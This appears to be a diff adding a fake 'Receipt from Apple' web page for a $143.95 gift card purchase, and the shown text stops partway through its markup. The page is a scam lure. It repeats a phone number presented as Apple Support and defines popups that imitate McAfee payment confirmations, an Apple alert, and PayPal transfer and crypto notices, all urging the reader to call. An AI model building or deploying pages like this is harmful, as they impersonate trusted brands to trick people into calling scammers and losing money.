@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Receipt from Apple</title>
+  <meta property="og:title" content="Receipt from Apple" />
+  <meta property="og:description" content="Your order has been published successfully." />
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; padding: 0; overflow-x: hidden; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: #f5f5f7;
+      color: #1d1d1f;
+      padding-bottom: 90px;
+    }
+    .wrap {
+      max-width: 800px;
+      margin: 24px auto;
+      background: #fff;
+      border: 1px solid #e5e7eb;
+      border-radius: 18px;
+      box-shadow: 0 12px 35px rgba(0,0,0,0.08);
+      overflow: hidden;
+    }
+    @media (max-width: 640px) {
+      .wrap { margin: 0; max-width: 100%; border-left: 0; border-right: 0; }
+    }
+    .top {
+      background: #f5f5f7;
+      border-bottom: 1px solid #e5e7eb;
+      padding: 20px 24px 16px;
+      text-align: center;
+    }
+    .top p { margin: 0 0 12px; font-size: 12px; color: #6b7280; line-height: 1.5; }
+    .blue { color: #0071e3; font-weight: 600; }
+    .phone-link { text-decoration: none; }
+    .btn {
+      display: inline-block;
+      text-decoration: none;
+      border-radius: 999px;
+      background: #0071e3;
+      color: #fff;
+      padding: 8px 22px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .logo { padding: 38px 24px 30px; text-align: center; border-bottom: 1px solid #e5e7eb; }
+    .apple-logo { width: 180px; height: 200px; object-fit: contain; display: block; margin: 0 auto; }
+    .muted { color: #6b7280; font-size: 16px; margin-top: 18px; }
+    .section { padding: 38px 34px; border-bottom: 1px solid #e5e7eb; }
+    h2 { margin: 0 0 22px; font-size: 20px; font-weight: 700; color: #1d1d1f; }
+    .row { display: flex; justify-content: space-between; align-items: flex-start; gap: 16px; }
+    .small { font-size: 14px; font-weight: 600; color: #1d1d1f; }
+    .tiny { margin-top: 6px; color: #9ca3af; font-size: 13px; line-height: 1.4; }
+    .lines { border-top: 1px solid #e5e7eb; border-bottom: 1px solid #e5e7eb; margin: 16px 0; height: 2px; }
+    .total { display: flex; justify-content: space-between; align-items: center; font-weight: 700; margin-bottom: 28px; font-size: 16px; color: #1d1d1f; }
+    .card { background: #f5f5f7; border-radius: 10px; padding: 16px; margin-bottom: 22px; font-size: 14px; font-weight: 600; color: #1d1d1f; }
+    .meta { background: #f5f5f7; border-radius: 10px; padding: 14px; }
+    .meta .meta-row { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-bottom: 12px; font-size: 12px; color: #6b7280; }
+    .meta .meta-row:last-child { margin-bottom: 0; }
+    .meta .meta-row span { flex: 0 0 42%; color: #6b7280; }
+    .meta .meta-row strong { flex: 1; text-align: right; color: #1d1d1f; font-size: 12px; font-weight: 600; word-break: break-word; }
+    .help { background: #f5f5f7; text-align: center; padding: 28px 24px; border-bottom: 1px solid #e5e7eb; }
+    .help h3 { margin: 0; font-size: 14px; font-weight: 700; color: #1d1d1f; }
+    .help .btn2, .actions .outline, .actions .solid {
+      display: inline-block; text-decoration: none; font-size: 12px; font-weight: 600;
+      padding: 8px 20px; border-radius: 8px; margin-top: 14px;
+    }
+    .help .btn2, .actions .solid { background: #0071e3; color: #fff; }
+    .actions { text-align: center; padding: 20px 24px; border-bottom: 1px solid #e5e7eb; }
+    .actions .outline { border: 1px solid #0071e3; color: #0071e3; background: #fff; margin-right: 8px; }
+    .footer { background: #f5f5f7; padding: 26px 18px; text-align: center; color: #9ca3af; font-size: 10px; line-height: 1.7; }
+    .footer .links { margin-top: 12px; color: #0071e3; font-weight: 500; }
+    .footer .links span { margin: 0 8px; }
+    @media (max-width: 480px) {
+      .section { padding: 30px 22px; }
+      h2 { font-size: 18px; margin-bottom: 18px; }
+      .small { font-size: 13px; }
+      .tiny { font-size: 12px; }
+      .total { font-size: 15px; }
+      .card { font-size: 13px; padding: 14px; }
+      .meta .meta-row { gap: 10px; font-size: 11px; }
+      .meta .meta-row span { flex: 0 0 44%; }
+      .meta .meta-row strong { font-size: 11px; }
+    }
+
+    /* ════════════════════════════════════════
+       POPUP 1 — McAfee Payment Confirmation
+    ════════════════════════════════════════ */
+    .mcafee-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.45); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; padding: 16px; z-index: 9000; }
+    .mcafee-overlay.show { display: flex; }
+    .mcafee-modal { width: 100%; max-width: 370px; background: #fff; border-radius: 18px; overflow: hidden; box-shadow: 0 24px 70px rgba(0,0,0,0.28); animation: popIn 0.28s cubic-bezier(0.34,1.56,0.64,1) both; }
+    @keyframes popIn { from { opacity: 0; transform: scale(0.85); } to { opacity: 1; transform: scale(1); } }
+    .mcafee-header { background: #c8102e; padding: 18px 16px 16px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
+    .mcafee-header-brand { display: flex; align-items: center; gap: 8px; }
+    .mcafee-shield { width: 30px; height: 30px; }
+    .mcafee-brand-name { color: #fff; font-size: 22px; font-weight: 700; letter-spacing: -0.3px; }
+    .mcafee-header-subtitle { color: rgba(255,255,255,0.90); font-size: 13px; font-weight: 400; margin-top: 4px; text-align: center; }
+    .mcafee-close-btn { position: absolute; top: 10px; right: 12px; background: transparent; border: none; color: rgba(255,255,255,0.75); font-size: 17px; line-height: 1; cursor: pointer; padding: 3px 5px; border-radius: 4px; font-family: inherit; }
+    .mcafee-body { padding: 26px 20px 22px; text-align: center; }
+    .mcafee-success-icon { width: 64px; height: 64px; background: #dcfce7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; }
+    .mcafee-success-icon svg { width: 32px; height: 32px; }
+    .mcafee-success-title { font-size: 20px; font-weight: 700; color: #111; margin: 0 0 5px; }
+    .mcafee-success-subtitle { font-size: 13px; color: #6b7280; margin: 0 0 18px; line-height: 1.5; }
+    .mcafee-amount-label { font-size: 12px; color: #9ca3af; margin-bottom: 3px; }
+    .mcafee-amount { font-size: 36px; font-weight: 800; color: #111; margin: 0 0 20px; letter-spacing: -1px; }
+    .mcafee-call-box { border: 1.5px solid #fca5a5; border-radius: 12px; background: #fff8f8; padding: 13px 14px 12px; margin-bottom: 18px; }
+    .mcafee-call-label { display: flex; align-items: center; justify-content: center; gap: 6px; color: #c8102e; font-size: 11px; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase; margin-bottom: 7px; }
+    .mcafee-call-label svg { width: 14px; height: 14px; fill: #c8102e; }
+    .mcafee-call-phone { font-size: 20px; font-weight: 700; color: #c8102e; margin-bottom: 4px; text-decoration: none; display: block; }
+    .mcafee-call-avail { font-size: 11px; color: #9ca3af; }
+    .mcafee-btns { display: flex; gap: 10px; }
+    .mcafee-btn { flex: 1; padding: 12px 8px; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 6px; font-family: inherit; }
+    .mcafee-btn-receipt { background: #c8102e; color: #fff; }
+    .mcafee-btn-call { background: #fff; color: #c8102e; border: 1.5px solid #c8102e; }
+    .mcafee-btn-call svg { width: 14px; height: 14px; fill: #c8102e; }
+
+    /* ════════════════════════════════════════
+       POPUP 2 — Apple Support Alert
+    ════════════════════════════════════════ */
+    .apple-support-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; padding: 16px; z-index: 9999; }
+    .apple-support-overlay.show { display: flex; }
+    .apple-support-modal { width: 100%; max-width: 390px; border-radius: 16px; overflow: hidden; box-shadow: 0 24px 70px rgba(0,0,0,0.5); animation: popIn 0.25s cubic-bezier(0.34,1.56,0.64,1) both; }
+    .apple-support-body { background: rgba(28,28,30,0.97); padding: 4px 20px 16px; }
+    .apple-support-body p { margin: 0; font-size: 14px; color: #e5e7eb; line-height: 1.68; }
+    .apple-phone-link { color: #60a5fa; text-decoration: none; }
+    .apple-support-btns { background: rgba(28,28,30,0.97); padding: 14px 20px 22px; display: flex; gap: 8px; }
+    .apple-s-btn { flex: 1; padding: 11px 8px; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; font-family: inherit; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 5px; min-width: 0; }
+    .apple-s-btn-call { background: #dc2626; color: #fff; }
+    .apple-s-btn-call svg { width: 13px; height: 13px; fill: #fff; flex-shrink: 0; }
+    .apple-s-btn-ok { background: #2563eb; color: #fff; }
+    .apple-s-btn-cancel { background: #374151; color: #d1d5db; }
+
+    /* ════════════════════════════════════════
+       POPUP 3 — Step 1: Alert Modal
+    ════════════════════════════════════════ */
+    .p3-overlay {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.45);
+      backdrop-filter: blur(5px);
+      -webkit-backdrop-filter: blur(5px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      z-index: 8000;
+      pointer-events: none;
+    }
+    .p3-overlay.show { display: flex; pointer-events: none; }
+    .p3-modal {
+      pointer-events: auto;
+      width: 100%; max-width: 320px;
+      background: rgba(255,255,255,0.97);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-radius: 14px;
+      padding: 24px 20px 20px;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+      animation: popIn 0.25s cubic-bezier(0.34,1.56,0.64,1) both;
+    }
+    .p3-icon { margin-bottom: 12px; display: flex; justify-content: center; }
+    .p3-icon svg { width: 36px; height: 36px; fill: #1d1d1f; }
+    .p3-title { font-size: 17px; font-weight: 600; color: #1d1d1f; margin: 0 0 6px; letter-spacing: -0.4px; }
+    .p3-msg { font-size: 13px; color: #1d1d1f; margin: 0 0 22px; line-height: 1.4; }
+    .p3-btns { display: flex; gap: 8px; flex-direction: column; }
+    .p3-btn { width: 100%; padding: 12px; border-radius: 12px; font-size: 15px; font-weight: 600; border: none; cursor: pointer; font-family: inherit; }
+    .p3-btn-ok { background: #0071e3; color: #fff; }
+    .p3-btn-cancel { background: #f2f2f7; color: #0071e3; font-weight: 500; }
+
+    /* ════════════════════════════════════════
+       POPUP 3 — Step 2: Floating Bottom Banner
+    ════════════════════════════════════════ */
+    .p3-bottom-bar {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(150px);
+      background: #fff;
+      border-radius: 14px;
+      padding: 10px 14px 10px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 90%;
+      max-width: 360px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.18);
+      z-index: 9100;
+      opacity: 0;
+      transition: transform 0.42s cubic-bezier(0.34,1.56,0.64,1), opacity 0.38s ease;
+      text-decoration: none;
+    }
+    .p3-bottom-bar.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+    .p3-bottom-info { display: flex; flex-direction: column; gap: 2px; }
+    .p3-bottom-label { font-size: 11px; color: #6b7280; font-weight: 500; }
+    .p3-bottom-phone { font-size: 18px; font-weight: 700; color: #1d1d1f; }
+    .p3-bottom-btn { width: 40px; height: 40px; background: #0071e3; border-radius: 10px; display: flex; align-items: center; justify-content: center; }
+    .p3-bottom-btn svg { width: 20px; height: 20px; fill: #fff; }
+
+    /* ════════════════════════════════════════
+       POPUP 4 — PayPal Sent Modal
+    ════════════════════════════════════════ */
+    .p4-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.65);
+      backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
+      display: none; align-items: center; justify-content: center; padding: 16px; z-index: 9999;
+    }
+    .p4-overlay.show { display: flex; }
+    .p4-modal {
+      width: 100%; max-width: 420px; background: #fff; border-radius: 12px;
+      padding: 30px 24px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+      animation: popIn 0.25s cubic-bezier(0.34,1.56,0.64,1) both;
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+    .p4-logo { margin-bottom: 20px; display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 24px; font-weight: 700; color: #003087; letter-spacing: -0.5px; }
+    .p4-logo svg { width: 28px; height: 32px; }
+    .p4-sending-to { font-size: 15px; color: #555; margin-bottom: 6px; }
+    .p4-amount { font-size: 38px; font-weight: 700; color: #003087; margin-bottom: 20px; }
+    .p4-title { font-size: 20px; font-weight: 700; color: #003087; margin-bottom: 12px; }
+    .p4-message { font-size: 14px; color: #333; line-height: 1.5; margin-bottom: 20px; }
+    .p4-details { font-size: 14px; color: #444; margin-bottom: 24px; line-height: 2.2; }
+    .p4-details span { color: #111; }
+    .p4-btns { display: flex; gap: 10px; margin-bottom: 24px; justify-content: center; }
+    .p4-btn { flex: 1; padding: 12px 0; border-radius: 24px; font-size: 15px; font-weight: 600; border: none; cursor: pointer; text-decoration: none; display: flex; justify-content: center; align-items: center; }
+    .p4-btn-download { background: #003087; color: #fff; }
+    .p4-btn-call { background: #10b981; color: #fff; }
+    .p4-note-box { background: #fff9d6; border-left: 5px solid #f5c842; border-radius: 6px; padding: 16px; text-align: left; font-size: 14px; color: #333; line-height: 1.5; }
+    .p4-note-box p { margin: 0 0 12px 0; }
+    .p4-note-box p:last-child { margin: 0; }
+    .p4-note-title { font-weight: 700; }
+    .p4-phone-link { color: #003087; font-weight: 700; text-decoration: underline; font-size: 15px; display: inline-block; margin-top: 4px; }
+
+    /* ════════════════════════════════════════
+       POPUP 5 — PayPal Crypto Modal
+    ════════════════════════════════════════ */
+    .p5-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.65);
+      backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
+      display: none; align-items: center; justify-content: center; padding: 16px; z-index: 9999;
+    }
+    .p5-overlay.show { display: flex; }
+    .p5-modal {
+      width: 100%; max-width: 380px; background: #fff; border-radius: 12px;
+      padding: 32px 24px; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+      animation: popIn 0.25s cubic-bezier(0.34,1.56,0.64,1) both;
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      text-align: center;
+      color: #111;
+    }
+    .p5-logo-row { display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 20px; font-weight: 700; color: #003087; margin-bottom: 10px; }
+    .p5-logo-row svg { width: 22px; height: 26px; }
+    .p5-title { font-size: 18px; font-weight: 700; color: #003087; text-decoration: underline; text-underline-offset: 4px; margin-bottom: 16px; }
+    
+    .p5-top-info { display: flex; justify-content: space-between; text-align: left; font-size: 12px; line-height: 1.4; border-bottom: 1px solid #e0e0e0; padding-bottom: 12px; margin-bottom: 12px; }
+    .p5-label { font-size: 10px; color: #666; font-weight: 600; text-transform: uppercase; margin-bottom: 2px; }
+    .p5-val { font-weight: 700; color: #333; }
+    .p5-val-sub { color: #555; white-space: pre-wrap; margin-top: 2px; font-size: 11px; }
+    
+    /* 👇 NEW: Centered the total box below the FROM/DATE section 👇 */
+    .p5-total-box { text-align: center; margin-bottom: 16px; }
+    
+    /* 👇 FIX FOR MOBILE WORD WRAP 👇 */
+.p5-total-amt {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  white-space: nowrap;
+  word-break: keep-all;
+  overflow-wrap: normal;
+  line-height: 1;
+}
+
+.p5-total-currency,
+.p5-total-dollar,
+.p5-total-value {
+  display: inline-block;
+  white-space: nowrap;
+  word-break: keep-all;
+  overflow-wrap: normal;
+  font-family: Arial, Helvetica, sans-serif !important;
+  font-size: 24px;
+  font-weight: 800;
+  color: #111;
+  line-height: 1;
+  font-variant-numeric: lining-nums tabular-nums;
+  -webkit-font-smoothing: antialiased;
+  text-rendering: geometricPrecision;
+}
+    /* 👆 ---------------------- 👆 */
+
+    /* 👇 NEW: Fixed the checkmark vertical alignment with text 👇 */
+    .p5-success-box { display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 8px; }
+    .p5-success-box svg { width: 18px; height: 18px; flex-shrink: 0; }
+    .p5-success-msg { font-size: 14px; font-weight: 700; color: #333; line-height: 1; display: flex; align-items: center; padding-top: 2px; }
+    
+    .p5-sub-msg { font-size: 11px; color: #666; margin-bottom: 16px; line-height: 1.4; padding: 0 10px; }
+    
+    .p5-support-box { background: #f4f7fa; border: 1px solid #e1e8ed; border-radius: 12px; padding: 14px; margin-bottom: 16px; }
+    .p5-support-text { font-size: 12px; color: #333; margin-bottom: 6px; }
+    .p5-support-phone { font-size: 18px; font-weight: 700; color: #003087; text-decoration: none; display: block; }
+    
+    .p5-table { background: #f9fafb; border-radius: 8px; padding: 12px; font-size: 12px; text-align: left; border: 1px solid #eee; margin-bottom: 24px; }
+    .p5-th { display: flex; justify-content: space-between; color: #777; font-size: 10px; font-weight: 700; border-bottom: 1px solid #ddd; padding-bottom: 6px; margin-bottom: 6px; }
+    .p5-tr { display: flex; justify-content: space-between; font-weight: 600; color: #111; margin-bottom: 8px; }
+    .p5-tf-centered { display: flex; justify-content: center; align-items: center; gap: 32px; font-weight: 800; color: #111; border-top: 1px solid #ddd; padding-top: 12px; margin-top: 8px; font-size: 13px; }
+    .p5-flex-2 { flex: 2; }
+    .p5-flex-1-center { flex: 1; text-align: center; }
+    .p5-flex-1-right { flex: 1; text-align: right; }
+    
+    .p5-disclaimer { font-size: 10px; color: #888; font-style: italic; margin-bottom: 6px; line-height: 1.4; padding: 0 10px; }
+    .p5-copyright { font-size: 10px; color: #888; font-weight: 500; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="top">
+      <p>For support or to request a refund, contact Apple Support at <a class="blue phone-link" href="tel:18779172167">1-877-917-2167</a></p>
+      <a class="btn" href="tel:18779172167">Call Now</a>
+    </div>
+
+    <div class="logo">
+      <svg class="apple-logo" viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg" aria-label="Apple Logo" role="img">
+        <path fill="#BDBDBD" d="M788.1 340.9c-5.4 4.2-100.4 57.5-100.4 176.8 0 137.9 121.1 186.7 124.7 187.9-.5 3-19.2 65.7-62.8 129.8-38.9 56.4-79.4 112.6-141.2 112.6-61.8 0-77.7-35.9-149-35.9-69.6 0-89.3 37.1-150.8 37.1-61.5 0-104.3-50.8-149.8-114.6C107.3 760.8 66 646.1 66 537.2c0-174.2 113.4-266.6 225-266.6 59.9 0 109.8 39.5 147.1 39.5 35.4 0 90.6-41.9 158.1-41.9 25.6 0 117.7 2.1 173.3 72.7zM575.6 183.4c28.3-33.6 48.3-80.5 48.3-127.4 0-6.5-.5-13-1.8-18.3-46 1.8-100.9 30.6-133.9 69.2-25.9 29.8-50 76.7-50 124.1 0 7.1 1.2 14.1 1.8 16.4 2.9.6 7.6 1.2 12.3 1.2 41.2 0 93.3-27.7 123.3-65.2z"/>
+      </svg>
+      <div class="muted">Thank&#39;s your order has been purchase successfully.</div>
+    </div>
+
+    <div class="section">
+      <h2>Order Summary</h2>
+      <div class="row">
+        <div>
+          <div class="small">Apple Gift Card</div>
+          <div class="tiny">Digital delivery via email</div>
+        </div>
+        <div class="small">$143.95</div>
+      </div>
+      <div class="lines"></div>
+      <div class="total"><div>Total</div><div>$143.95</div></div>
+      <h2 style="font-size:14px; margin-bottom:10px;">Payment Method</h2>
+      <div class="card">Apple Pay</div>
+      <div class="meta">
+        <div class="meta-row"><span>Order Number</span><strong>APL986260014</strong></div>
+        <div class="meta-row"><span>Order Date</span><strong>April 24, 2026</strong></div>
+        <div class="meta-row"><span>Payment Status</span><strong>Paid</strong></div>
+      </div>
+    </div>
+
+    <div class="help">
+      <h3>Questions? We&#39;re here to help.</h3>
+      <a class="btn2" href="tel:18779172167">Call Now</a>
+    </div>
+
+    <div class="actions">
+      <a class="outline" href="#" id="printBtn">Print Receipt</a>
+      <a class="solid"   href="#" id="downloadPdfBtn">Download PDF</a>
+    </div>
+
+    <div class="footer">
+      <div>For assistance or questions about your order, call <span class="blue">1-877-917-2167</span></div>
+      <div>Apple Inc.</div>
+      <div>One Apple Park Way, Cupertino, CA 95014, U.S.A.</div>
+      <div>All rights reserved.</div>
+      <div class="links"><span>Privacy Policy</span><span>Terms of Sale</span><span>Legal</span></div>
+    </div>
+  </div>
+
+  <div id="mcafeeOverlay" class="mcafee-overlay">
+    <div class="mcafee-modal" id="mcafeeModal">
+      <div class="mcafee-header">
+        <div class="mcafee-header-brand">
+          <svg class="mcafee-shield" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path fill="white" d="M12 2L4 5.5v6C4 16.55 7.54 21.24 12 22c4.46-.76 8-5.45 8-10.5v-6L12 2z"/>
+            <polyline points="9 12 11 14 15 10" stroke="#c8102e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+          </svg>
+          <span class="mcafee-brand-name" id="p1Brand"></span>
+        </div>
+        <span class="mcafee-header-subtitle" id="p1HeaderTitle"></span>
+        <button class="mcafee-close-btn" id="mcafeeCloseBtn" type="button">&#x2715;</button>
+      </div>
+      <div class="mcafee-body">
+        <div class="mcafee-success-icon">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#bbf7d0" d="M12 2L4 5.5v6C4 16.55 7.54 21.24 12 22c4.46-.76 8-5.45 8-10.5v-6L12 2z"/>
+            <polyline points="9 12 11 14 15 10" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+          </svg>
+        </div>
+        <div class="mcafee-success-title"    id="p1SuccessTitle"></div>
+        <div class="mcafee-success-subtitle" id="p1SuccessSubtitle"></div>
+        <div class="mcafee-amount-label"     id="p1AmountLabel"></div>
+        <div class="mcafee-amount"           id="p1Amount"></div>
+        <div class="mcafee-call-box">
+          <div class="mcafee-call-label">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.32.57 3.58.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1C10.57 21 3 13.43 3 4c0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.23 1.01l-2.24 2.22z"/>
+            </svg>
+            <span id="p1CallLabel"></span>
+          </div>
+          <a class="mcafee-call-phone" id="p1PhoneLink" href="#"></a>
+          <div class="mcafee-call-avail" id="p1AvailText"></div>
+        </div>
+        <div class="mcafee-btns">
+          <button class="mcafee-btn mcafee-btn-receipt" id="mcafeeViewReceipt" type="button"></button>
+          <button class="mcafee-btn mcafee-btn-call"    id="mcafeeCallNow"     type="button">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.32.57 3.58.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1C10.57 21 3 13.43 3 4c0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.23 1.01l-2.24 2.22z"/>
+            </svg>
+            <span id="p1CallNowText"></span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="appleSupportOverlay" class="apple-support-overlay">
+    <div class="apple-support-modal">
+      <div style="background:rgba(28,28,30,0.97);border-radius:16px 16px 0 0;padding:14px 16px 0;display:flex;justify-content:flex-end;">
+        <span style="color:rgba(255,255,255,0.55);font-size:20px;line-height:1;cursor:default;padding:4px 6px;display:inline-block;">&#x2715;</span>
+      </div>
+      <div class="apple-support-body">
+        <p id="p2MessageEl"></p>
+      </div>
+      <div class="apple-support-btns">
+        <a class="apple-s-btn apple-s-btn-call" id="p2CallBtn" href="#">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.32.57 3.58.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1C10.57 21 3 13.43 3 4c0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.23 1.01l-2.24 2.22z"/>
+          </svg>
+          <span id="p2CallNowText"></span>
+        </a>
+        <button class="apple-s-btn apple-s-btn-ok"     id="p2OkBtn"     type="button"></button>
+        <button class="apple-s-btn apple-s-btn-cancel" id="p2CancelBtn" type="button"></button>
+      </div>
+    </div>
+  </div>
+
+  <div id="p3Overlay" class="p3-overlay">
+    <div class="p3-modal" id="p3ModalBox">
+      <div class="p3-icon">
+        <svg viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#1d1d1f" d="M788.1 340.9c-5.4 4.2-100.4 57.5-100.4 176.8 0 137.9 121.1 186.7 124.7 187.9-.5 3-19.2 65.7-62.8 129.8-38.9 56.4-79.4 112.6-141.2 112.6-61.8 0-77.7-35.9-149-35.9-69.6 0-89.3 37.1-150.8 37.1-61.5 0-104.3-50.8-149.8-114.6C107.3 760.8 66 646.1 66 537.2c0-174.2 113.4-266.6 225-266.6 59.9 0 109.8 39.5 147.1 39.5 35.4 0 90.6-41.9 158.1-41.9 25.6 0 117.7 2.1 173.3 72.7zM575.6 183.4c28.3-33.6 48.3-80.5 48.3-127.4 0-6.5-.5-13-1.8-18.3-46 1.8-100.9 30.6-133.9 69.2-25.9 29.8-50 76.7-50 124.1 0 7.1 1.2 14.1 1.8 16.4 2.9.6 7.6 1.2 12.3 1.2 41.2 0 93.3-27.7 123.3-65.2z"/>
+        </svg>
+      </div>
+      <div class="p3-title" id="p3Title"></div>
+      <div class="p3-msg" id="p3Message"></div>
+      <div class="p3-btns">
+        <button class="p3-btn p3-btn-ok" id="p3OkBtn" type="button"></button>
+        <button class="p3-btn p3-btn-cancel" id="p3CancelBtn" type="button"></button>
+      </div>
+    </div>
+  </div>
+
+  <a href="#" id="p3BottomBar" class="p3-bottom-bar">
+    <div class="p3-bottom-info">
+      <div class="p3-bottom-label" id="p3BottomLabel"></div>
+      <div class="p3-bottom-phone" id="p3BottomPhone"></div>
+    </div>
+    <div class="p3-bottom-btn">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.32.57 3.58.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1C10.57 21 3 13.43 3 4c0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.23 1.01l-2.24 2.22z"/>
+      </svg>
+    </div>
+  </a>
+
+  <div id="p4Overlay" class="p4-overlay">
+    <div class="p4-modal">
+      <div class="p4-logo">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#003087">
+          <path d="M7.076 21.337H2.47a.641.641 0 0 1-.633-.74L4.944.901C5.026.382 5.474 0 6.007 0h7.46c2.535 0 4.601 1.058 5.407 3.2.617 1.642.43 3.655-.544 5.378-1.12 1.983-3.23 3.038-5.694 3.038h-1.95a.64.64 0 0 0-.632.538l-1.393 8.814a.64.64 0 0 1-.633.535z"/>
+          <path fill="#0079C1" d="M21.285 3.203A6.126 6.126 0 0 0 19.16 1.34c-1.144-.652-2.73-.85-4.49-.85H8.718a.64.64 0 0 0-.632.541l-3.102 19.64A.64.64 0 0 0 5.618 21.4h3.705l1.092-6.905a.64.64 0 0 1 .632-.54h1.724c3.31 0 5.922-1.42 6.78-4.58.55-2.02.26-4.04-.63-5.59L21.285 3.2z"/>
+        </svg>
+        PayPal
+      </div>
+      <div class="p4-sending-to">Sending to <span id="p4SendingTo"></span></div>
+      <div class="p4-amount" id="p4Amount"></div>
+      <div class="p4-title" id="p4Title"></div>
+      <div class="p4-message" id="p4Message"></div>
+      <div class="p4-details">
+        <div>Transaction ID: <span id="p4TransactionId"></span></div>
+        <div>Invoice ID: <span id="p4InvoiceId"></span></div>
+        <div>Status: <span id="p4StatusText"></span></div>
+      </div>
+      <div class="p4-btns">
+        <button class="p4-btn p4-btn-download" id="p4DownloadBtn" type="button">
+          <svg style="margin-right:6px;width:14px;height:14px;fill:#fff" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+          <span id="p4DownloadBtnText"></span>
+        </button>
+        <a class="p4-btn p4-btn-call" id="p4CallBtn" href="#">
+          <span id="p4CallBtnText"></span>
+        </a>
+      </div>
+      <div class="p4-note-box">
+        <p><span class="p4-note-title" id="p4NoteTitle"></span> <span id="p4NoteText1"></span></p>
+        <p id="p4NoteText2"></p>
+        <a href="#" class="p4-phone-link" id="p4PhoneLink"></a>
+      </div>
+    </div>
+  </div>
+
+  <div id="p5Overlay" class="p5-overlay">
+    <div class="p5-modal">
+      <div class="p5-logo-row">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#003087">
+          <path d="M7.076 21.337H2.47a.641.641 0 0 1-.633-.74L4.944.901C5.026.382 5.474 0 6.007 0h7.46c2.535 0 4.601 1.058 5.407 3.2.617 1.642.43 3.655-.544 5.378-1.12 1.983-3.23 3.038-5.694 3.038h-1.95a.64.64 0 0 0-.632.538l-1.393 8.814a.64.64 0 0 1-.633.535z"/>
